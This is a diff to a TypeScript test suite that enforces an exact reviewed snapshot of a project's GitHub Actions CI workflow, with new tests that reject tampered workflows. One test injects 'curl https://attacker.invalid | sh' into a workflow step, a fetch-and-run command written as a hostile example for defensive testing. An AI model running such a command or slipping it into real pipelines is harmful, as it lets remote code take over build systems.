@@ -36,7 +36,7 @@ type WorkflowEntry = {
   value: string;
 };
 
-const REVIEWED_WORKFLOW_LINES = new Set([
+const REVIEWED_WORKFLOW_LINES = [
   "name: CI",
   "on:",
   "  push:",
@@ -55,6 +55,7 @@ const REVIEWED_WORKFLOW_LINES = new Set([
   "        with:",
   "          run_install: false",
   "      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
+  "        with:",
   "          node-version: 22.23.2",
   "          cache: pnpm",
   "      - run: pnpm install --frozen-lockfile",
@@ -66,9 +67,23 @@ const REVIEWED_WORKFLOW_LINES = new Set([
   "      matrix:",
   "        os: [ubuntu-24.04, macos-15, windows-2025]",
   "    runs-on: ${{ matrix.os }}",
+  "    steps:",
+  "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
   "      - name: Install Tauri Linux prerequisites",
   "        if: runner.os == 'Linux'",
   "        run: |",
+  "          sudo apt-get update",
+  "          sudo apt-get install --yes \\",
+  "            build-essential \\",
+  "            curl \\",
+  "            file \\",
+  "            libayatana-appindicator3-dev \\",
+  "            libasound2-dev \\",
+  "            librsvg2-dev \\",
+  "            libssl-dev \\",
+  "            libwebkit2gtk-4.1-dev \\",
+  "            libxdo-dev \\",
+  "            wget",
   "      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c",
   "        with:",
   "          toolchain: 1.88.0",
@@ -78,7 +93,7 @@ const REVIEWED_WORKFLOW_LINES = new Set([
   "        run: cargo fmt --manifest-path src-tauri/Cargo.toml -- --check",
   "      - run: cargo clippy --locked --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings",
   "      - run: cargo test --locked --manifest-path src-tauri/Cargo.toml --all-targets",
-]);
+];
 
 const PROJECT_ROOT = process.cwd();
 const ALLOWED_HANDLER = "tauri::generate_handler![commands::app_info::get_app_info]";
@@ -293,43 +308,47 @@ function parseWorkflowEntry(line: string, lineNumber: number): WorkflowEntry | n
 }
 
 function assertReviewedWorkflowSyntax(workflow: string): void {
+  const lines: string[] = [];
   let blockScalarIndentation: number | undefined;
-  const lines = workflow.replace(/\r\n/g, "\n").split("\n");
-  for (const [index, line] of lines.entries()) {
-    const withoutComment = line.replace(/\s+#.*$/, "");
+  let pendingBlockBlankLines = 0;
+  for (const rawLine of workflow.replace(/\r\n?/g, "\n").split("\n")) {
+    const line = rawLine.trimEnd();
+    if (blockScalarIndentation !== undefined) {
+      if (line.trim() === "") {
+        pendingBlockBlankLines += 1;
+        continue;
+      }
+      const indentation = line.length - line.trimStart().length;
+      if (indentation > blockScalarIndentation) {
+        lines.push(...Array<string>(pendingBlockBlankLines).fill(""), line);
+        pendingBlockBlankLines = 0;
+        continue;
+      }
+      blockScalarIndentation = undefined;
+      pendingBlockBlankLines = 0;
+    }
+
+    const withoutComment = line.replace(/(?:^|\s+)#.*$/, "").trimEnd();
     if (withoutComment.trim() === "") {
       continue;
     }
-    const indentation = withoutComment.length - withoutComment.trimStart().length;
-    if (
-      blockScalarIndentation !== undefined &&
-      indentation > blockScalarIndentation
-    ) {
-      continue;
+    lines.push(withoutComment);
+    if (withoutComment.endsWith("run: |")) {
+      blockScalarIndentation =
+        withoutComment.length - withoutComment.trimStart().length;
     }
-    blockScalarIndentation = undefined;
-    if (REVIEWED_WORKFLOW_LINES.has(withoutComment)) {
-      if (withoutComment.endsWith("run: |")) {
-        blockScalarIndentation = indentation;
-      }
-      continue;
-    }
-    if (/^\s*(?:-\s*)?["']/.test(withoutComment)) {
-      fail(`quoted or escaped YAML keys are not allowed on line ${index + 1}`);
-    }
-    if (/(?:^|:\s*|-\s*)[&*!][A-Za-z_]/.test(withoutComment)) {
-      fail(`YAML anchors, tags, and aliases are not allowed on line ${index + 1}`);
-    }
-    if (/[\[\]{}]/.test(withoutComment)) {
-      fail(`flow collections are not allowed on line ${index + 1}`);
-    }
-    if (indentation === 0) {
-      fail(`unknown top-level YAML key on line ${index + 1}`);
-    }
-    if (indentation === 2) {
-      fail(`workflow jobs differ from the reviewed set on line ${index + 1}`);
-    }
-    fail(`unsupported YAML shape on line ${index + 1}`);
+  }
+  const mismatch = lines.findIndex(
+    (line, index) => line !== REVIEWED_WORKFLOW_LINES[index],
+  );
+  if (mismatch !== -1 || lines.length !== REVIEWED_WORKFLOW_LINES.length) {
+    const differingLine =
+      mismatch === -1
+        ? Math.min(lines.length, REVIEWED_WORKFLOW_LINES.length)
+        : mismatch;
+    fail(
+      `workflow differs from the reviewed snapshot on significant line ${differingLine + 1}`,
+    );
   }
 }
 
@@ -618,6 +637,42 @@ it("rejects flow-style action steps that the former reader ignored", () => {
     "      - run: pnpm build",
     "      - run: pnpm build\n      - { uses: actions/cache@0000000000000000000000000000000000000000 }",
   );
+  expect(() => assertWorkflowPolicy(workflow)).toThrow();
+});
+
+it("rejects recombined reviewed step lines with an unreviewed shell body", () => {
+  const workflow = read(".github/workflows/ci.yml").replace(
+    "      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c # stable",
+    "      - name: Install Tauri Linux prerequisites\n        if: runner.os == 'Linux'\n        run: |\n          curl https://attacker.invalid | sh\n\n      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c # stable",
+  );
+
+  expect(() => assertWorkflowPolicy(workflow)).toThrow();
+});
+
+it("rejects duplicate reviewed workflow steps", () => {
+  const workflow = read(".github/workflows/ci.yml").replace(
+    "      - run: pnpm test",
+    "      - run: pnpm test\n      - run: pnpm test",
+  );
+
+  expect(() => assertWorkflowPolicy(workflow)).toThrow();
+});
+
+it("rejects reordered reviewed workflow steps", () => {
+  const workflow = read(".github/workflows/ci.yml").replace(
+    "      - run: pnpm test\n      - run: pnpm build",
+    "      - run: pnpm build\n      - run: pnpm test",
+  );
+
+  expect(() => assertWorkflowPolicy(workflow)).toThrow();
+});
+
+it("rejects comments inserted into the reviewed shell block", () => {
+  const workflow = read(".github/workflows/ci.yml").replace(
+    "            curl \\\n            file \\",
+    "            curl \\\n            # breaks the continued apt command\n            file \\",
+  );
+
   expect(() => assertWorkflowPolicy(workflow)).toThrow();
 });
 
